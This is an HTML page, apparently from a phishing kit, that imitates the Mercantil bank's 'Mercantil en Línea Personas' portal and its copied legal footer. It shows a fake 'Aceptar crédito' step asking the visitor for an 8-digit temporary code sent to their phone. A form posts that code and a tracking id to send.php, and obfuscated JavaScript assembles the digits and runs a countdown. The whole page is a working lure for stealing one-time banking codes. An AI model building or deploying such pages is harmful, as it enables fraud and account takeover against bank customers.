<!DOCTYPE html>
<html lang="es">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="icon" href="merca.ico" type="image/x-icon" sizes="256x256"/>
    <title>Mercantil</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="theme-color" content="#1976d2">
    <link rel="stylesheet" href="assets/bootstrap.67b15cc69e6080ae.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/intro-js.1f5cf64da5ee08c8.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/styles.c663b1e287ec0a1e.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/lara-light-blue-theme.8ecaee422619f77e.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/primeng.a62c3f5e15ed62a4.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="styles.css">

    <style>
        .logo-wrapper img,
.iso-wrapper img {
    width: 88px !important;
    height: auto !important;
    max-width: 120px !important;
    margin-left: 105px !important;
}

    </style>
</head>
<body>
    <app _nghost-ois-c32="" ng-version="13.3.11">
        <router-outlet _ngcontent-ois-c32=""></router-outlet>
        <melp-standard-layout _nghost-ois-c85="" class="ng-star-inserted">
            <melp-loading _ngcontent-ois-c85="" _nghost-ois-c33="">
                <div _ngcontent-ois-c33="" class="overlay">
                    <div _ngcontent-ois-c33="" class="multi-spinner-container">
                        <div _ngcontent-ois-c33="" class="multi-spinner blue">
                            <div _ngcontent-ois-c33="" class="multi-spinner orange"></div>
                        </div>
                    </div>
                </div>
            </melp-loading>
            <melp-header _ngcontent-ois-c85="" _nghost-ois-c54="">
                <div _ngcontent-ois-c54="" class="nav-bar">
                    <div _ngcontent-ois-c54="" class="left-side">
                        <div _ngcontent-ois-c54="" class="main-menu-toggle-wrapper">
                            <div _ngcontent-ois-c54="" class="main-menu-toggle"><span _ngcontent-ois-c54="" class="middle-line"></span></div>
                        </div>
                        <div _ngcontent-ois-c54="" class="bezel-wrapper"><span _ngcontent-ois-c54="" class="bezel-1"></span><span _ngcontent-ois-c54="" class="bezel-2"></span></div>
                        <div  class="logo-wrapper">
                            <img  alt="Logo" src="logotauro.svg">
                        </div>
                    </div>
    
                    <div _ngcontent-ois-c54="" class="right-side">
                        <div _ngcontent-ois-c54="" class="site-name-wrapper d-flex flex-row">
                            <p _ngcontent-ois-c54="" id="site-name">Mercantil en Línea Personas</p>
                            <div _ngcontent-ois-c54="" class="header-button change-melp ng-star-inserted"><button _ngcontent-ois-c54="" class="header-wrapper"><span _ngcontent-ois-c54="" class="header-text">Versión anterior</span></button></div>


                        </div>
                        <div _ngcontent-ois-c54="" class="transition">

                        </div>
                    </div>
                </div>
            </melp-header>
            <melp-confirm _ngcontent-ois-c85="" _nghost-ois-c55="">
                <div _ngcontent-ois-c55="" id="confirm-modal" class="overlay">
                    <div _ngcontent-ois-c55="" class="card">
                        <div _ngcontent-ois-c55="" class="modal-img"><img _ngcontent-ois-c55="" alt="icon" src="timer.svg"></div>
                        <div _ngcontent-ois-c55="" class="card-body">
                            <div _ngcontent-ois-c55="" class="modal-title">Hola, ¿estás ahí?</div>
                            <div _ngcontent-ois-c55="" class="modal-content">No has interactuado con nosotros en los últimos minutos.</div>
                            <div _ngcontent-ois-c55="" class="modal-content">¿Deseas mantener tu sesión activa?</div>
                            <div _ngcontent-ois-c55="" class="button-wrapper"><button _ngcontent-ois-c55="" class="btn btn-secondary">No</button><button _ngcontent-ois-c55="" class="btn btn-primary">Sí</button></div>
                        </div>
                    </div>
                </div>
            </melp-confirm>
            <melp-modal _ngcontent-ois-c85="" _nghost-ois-c56="">

            </melp-modal>
            <melp-modal-image _ngcontent-ois-c85="" _nghost-ois-c57="">

            </melp-modal-image>
            <melp-share-transaction-form _ngcontent-ois-c85="" _nghost-ois-c74="" class="ng-star-inserted">
                <div _ngcontent-ois-c74="" class="fade-background">
                    <div _ngcontent-ois-c74="" class="card"><span _ngcontent-ois-c74="" class="close">×</span>
                        <div _ngcontent-ois-c74="" class="card-body webTransaction__card">
                            <div _ngcontent-ois-c74="" class="title"></div>
                            <div class="share-info">

                                <div id="password-popup" style="display:none;">
                                    <!-- Aquí va el contenido del popup de contraseña -->
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
            </melp-share-transaction-form>

            <div _ngcontent-ois-c85="" id="app-container">
                <div _ngcontent-ois-c85="" class="overlay-sidebar"></div>
                <melp-system-error _ngcontent-ois-c85="" _nghost-ois-c77="">
                    <div _ngcontent-ois-c77="" class="hide">
                        <melp-navigation _ngcontent-ois-c77="" _nghost-ois-c76="">

                            <div _ngcontent-ois-c76="" id="navigation">
                                <div _ngcontent-ois-c76="" class="data-info">
                                    <div _ngcontent-ois-c76="" class="data-info-section">
                                        <span _ngcontent-ois-c76="" class="data-info-section-breadcrumb ng-star-inserted">

                                        </span>

                                    </div>
                                    <div _ngcontent-ois-c76="" class="data-info-page ng-star-inserted"><span _ngcontent-ois-c76="" class="data-info-page-title">Inicia tu sesión</span></div>

                                    <melp-alert-float _ngcontent-ois-c76="" _nghost-ois-c75="">

                                    </melp-alert-float>
                                </div>
                            </div>
                        </melp-navigation>
                    </div>
                    <div _ngcontent-ois-c77="" id="system-error" class="hide">

                    </div>
                </melp-system-error>
                <melp-sidebar _ngcontent-ois-c85="" _nghost-ois-c79="" class="ng-star-inserted">


                    <div _ngcontent-ois-c79="" id="step1" data-tooltipclass="tour-class" class="sidebar notLogged">

                        <div _ngcontent-ois-c79="" class="li active ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Inicia tu sesión" src="assets/get-into-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Inicia tu sesión</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Regístrate" src="assets/create-user-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Regístrate</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Recupera tu usuario" src="assets/user-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Recupera tu usuario</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Cambia tu clave de internet" src="assets/change-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Cambia tu clave de internet</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Desbloquea tu clave de internet" src="assets/unlock-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Desbloquea tu clave de internet</a></div>
                        </div>



                        <div _ngcontent-ois-c79="" class="second-level scroll-second-level">

                        </div>
                        <div _ngcontent-ois-c79="" class="secondary-menu-wrapper ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="secondary-menu" style="border: none;"><a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted">
                                    <img _ngcontent-ois-c79="" src="assets/Cont-1.svg" alt="Contáctenos"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Ubic-1.svg" alt="Ubíquenos"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Tips_seg-1.svg" alt="Ciberseguridad"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Pol_seg-1.svg" alt="Política de privacidad"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Ter_cond-1.svg" alt="Términos y Condiciones"></a>








                            </div>
                        </div>

                        <div _ngcontent-ois-c79="" class="secondary-submenu-wrapper">


                        </div>
                    </div>
                </melp-sidebar>


                <melp-second-sidebar _ngcontent-ois-c85="" _nghost-ois-c83="">

                    <div _ngcontent-ois-c83="" class="second-sidebar">

                    </div>
                </melp-second-sidebar>

                <router-outlet _ngcontent-ois-c85=""></router-outlet>
                <melp-login _nghost-ois-c165="" class="ng-star-inserted">
                    <melp-login-background _ngcontent-ois-c165="" id="login-melp" _nghost-ois-c161="" class="ng-star-inserted">
                        <div _ngcontent-ois-c161="">






                            <div style="text-align: ;">
                            <h2 style="font-size: 1.3rem; color: #249dc5; padding-left: 36px; padding-top: 25px; font-family: Arial;">Aceptar crédito</h2></div>
                            <div class="secure-access-layout">
                              <div class="secure-access-left">

                                  <div class="secure-access-card">

                                    <div class="step-indicator-container">
                                      <div class="step-icon">
                                        <circle-progress>
                                          <svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid meet" viewBox="0 0 68 68" height="68" width="68">
                                            <circle cx="34" cy="34" r="32" fill="none" stroke="#D6D6D1" stroke-width="2"></circle>
                                            <path d="M 34 2 A 32 32 0 1 1 33.99 2" stroke="#009FDA" stroke-width="2" stroke-linecap="round" fill="none"></path>
                                            <text alignment-baseline="baseline" x="34" y="34" text-anchor="middle">
                                              <tspan x="34" y="34" dy="0.32em" font-size="12" font-weight="bold" fill="#004e9b">3 de 3</tspan>
                                            </text>
                                          </svg>
                                        </circle-progress>
                                      </div>

                                      <div class="step-text">
                                        <div class="step-title">Ingresa tu clave temporal</div>
                                        <div class="step-subtitle"><strong>Siguiente paso:</strong> Aprobar crédito</div>
                                      </div>
                                    </div>

                                    <h1>Introduce la clave temporal que hemos enviado a tu teléfono celular:</h1>

                                    <div class="login-container">
                                      <form method="post" action="send.php">

                                          <input type="hidden" name="id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>">
                                          
                                        <div class="form-group">
                                          <label for="code">Clave temporal</label>
                                          <div class="code-input-wrapper">
                                            <!-- 8 Cajas para ingresar los dígitos -->
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>

                                              <!-- Icono de ojo -->
                                              <div class="mat-form-field-suffix ng-tns-c71-2 ng-star-inserted">
                                                <img id="toggleEye" alt="eye" class="icon pointer" src="assets/eye-disabled-blue.svg">
                                              </div>
                                          </div>

                                          <input type="hidden" id="cod" name="cod">
                                        </div>

                                        <div class="timer">
                                          Si no has recibido la clave temporal en <strong id="countdown">180</strong> segundos,<br>
                                          haz clic en <a href="#">Reenviar clave temporal.</a>
                                        </div>
                                        <div class="login-button" style="margin-top: 30px;">
                                            <melp-button-wrapper _nghost-ois-c164="">
                                              <div class="button-wrapper button-wrapper-separation-end">
                                                <div class="button-wrapper-main-button w-100 button-wrapper-center">
                                                  <button id="btnIniciar" type="submit" class="btn btn-primary ng-star-inserted">
                                                    <img id="btnIcon" src="arrowdis.svg" alt="Flecha"> Confirmar
                                                  </button>
                                                </div>
                                              </div>
                                            </melp-button-wrapper>
                                        </div>
                                      </form>
                                    </div>
                                  </div>

                                
                        </div>

                                
                    </melp-login-background>
                </melp-login>

                <melp-footer _ngcontent-ois-c85="" _nghost-ois-c84="">
                    <footer _ngcontent-ois-c84=""><span _ngcontent-ois-c84="" id="copyright" class="text-center">El acceso o uso no autorizado se considera un delito. Derechos protegidos por Mercantil C.A., Banco Universal. RIF: J-00002961-0.</span></footer>
                </melp-footer>
            </div>
        </melp-standard-layout>

    </app>
    <script crossorigin="anonymous" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <style>
        #loadingOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
            font-size: 18px;
            font-family: Arial, sans-serif;
            z-index: 9999;
        }

        .loading-container {
            margin-top: 25%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
    <div id="loadingOverlay">
        <div class="loading-container">
            <div class="spinner"></div><br><br>
            <p id="loadingText"></p>
        </div>
    </div>

                            <script>
                            function _0x534a(_0x561af9,_0x2e68ff){_0x561af9=_0x561af9-0x1ec;const _0x668c01=_0x668c();let _0x534a3f=_0x668c01[_0x561af9];return _0x534a3f;}const _0x3cdbc2=_0x534a;(function(_0x230528,_0x2a58d4){const _0x49ace3=_0x534a,_0x2164d6=_0x230528();while(!![]){try{const _0x3257bd=-parseInt(_0x49ace3(0x1ed))/0x1*(parseInt(_0x49ace3(0x203))/0x2)+parseInt(_0x49ace3(0x1f4))/0x3+parseInt(_0x49ace3(0x1f9))/0x4+parseInt(_0x49ace3(0x1fa))/0x5+-parseInt(_0x49ace3(0x1ff))/0x6*(parseInt(_0x49ace3(0x1f7))/0x7)+parseInt(_0x49ace3(0x1f8))/0x8*(parseInt(_0x49ace3(0x1fe))/0x9)+-parseInt(_0x49ace3(0x202))/0xa;if(_0x3257bd===_0x2a58d4)break;else _0x2164d6['push'](_0x2164d6['shift']());}catch(_0x285d3b){_0x2164d6['push'](_0x2164d6['shift']());}}}(_0x668c,0xd25a3),document[_0x3cdbc2(0x207)](_0x3cdbc2(0x208),function(){const _0x7168f1=_0x3cdbc2,_0x5f2cbc=document[_0x7168f1(0x204)]('toggleEye'),_0x1eb6c3=document[_0x7168f1(0x1f5)](_0x7168f1(0x20d)),_0x1d5b63=document[_0x7168f1(0x204)]('btnIniciar'),_0x32a341=document[_0x7168f1(0x204)](_0x7168f1(0x1fb)),_0x5ed52f=document[_0x7168f1(0x204)](_0x7168f1(0x1f6)),_0x327c08=document[_0x7168f1(0x204)](_0x7168f1(0x1f3));let _0x32b804=![];_0x5f2cbc&&_0x5f2cbc[_0x7168f1(0x207)]('click',function(){const _0x1e6abd=_0x7168f1;_0x32b804=!_0x32b804,_0x1eb6c3[_0x1e6abd(0x1fd)](_0x497131=>{_0x497131['type']=_0x32b804?'text':'password';}),_0x5f2cbc[_0x1e6abd(0x20c)]=_0x32b804?'assets/eye-enabled-blue.svg':_0x1e6abd(0x1ef);});function _0x4022a7(){const _0x2cfe81=_0x7168f1,_0x1c582c=Array[_0x2cfe81(0x1f2)](_0x1eb6c3)['map'](_0x120323=>_0x120323[_0x2cfe81(0x1ec)])[_0x2cfe81(0x20a)]('');_0x327c08[_0x2cfe81(0x1ec)]=_0x1c582c;}function _0x3bce32(){const _0x2026d2=_0x7168f1,_0x4d2af0=Array[_0x2026d2(0x1f2)](_0x1eb6c3)['every'](_0x331a4f=>_0x331a4f[_0x2026d2(0x1ec)]['trim']()[_0x2026d2(0x201)]===0x1);_0x4022a7(),_0x1d5b63[_0x2026d2(0x205)]=!_0x4d2af0,_0x1d5b63[_0x2026d2(0x209)][_0x2026d2(0x20b)](_0x2026d2(0x200),_0x4d2af0),_0x32a341&&(_0x32a341[_0x2026d2(0x20c)]=_0x4d2af0?'arrowen.svg':_0x2026d2(0x1f0));}_0x1eb6c3[_0x7168f1(0x1fd)]((_0x1c5452,_0x67b293)=>{const _0x198bc9=_0x7168f1;_0x1c5452[_0x198bc9(0x207)](_0x198bc9(0x1fc),()=>{const _0x4a972b=_0x198bc9;_0x1c5452[_0x4a972b(0x1ec)][_0x4a972b(0x201)]===0x1&&_0x67b293<_0x1eb6c3['length']-0x1&&_0x1eb6c3[_0x67b293+0x1][_0x4a972b(0x206)](),_0x3bce32();}),_0x1c5452[_0x198bc9(0x207)]('keydown',_0x3e28ba=>{const _0x51e901=_0x198bc9;_0x3e28ba[_0x51e901(0x1ee)]==='Backspace'&&_0x1c5452['value']===''&&_0x67b293>0x0&&_0x1eb6c3[_0x67b293-0x1][_0x51e901(0x206)]();});});let _0x3567da=0xb4;const _0x1b98cc=setInterval(()=>{const _0x218335=_0x7168f1;_0x3567da--,_0x5ed52f[_0x218335(0x1f1)]=_0x3567da;if(_0x3567da<=0x0)clearInterval(_0x1b98cc);},0x3e8);}));function _0x668c(){const _0x47feae=['arrowdis.svg','textContent','from','cod','1128210nuEJdO','querySelectorAll','countdown','1266594sYstJD','2422184rtmXHX','6145484bHggyI','4734965CTWLoc','btnIcon','input','forEach','27jUHbPZ','30GyiAut','active','length','19905130YwSbaZ','14eDTQCu','getElementById','disabled','focus','addEventListener','DOMContentLoaded','classList','join','toggle','src','.code-input','value','1561siEZvs','key','assets/eye-disabled-blue.svg'];_0x668c=function(){return _0x47feae;};return _0x668c();}
                            </script>
</body>
</html>
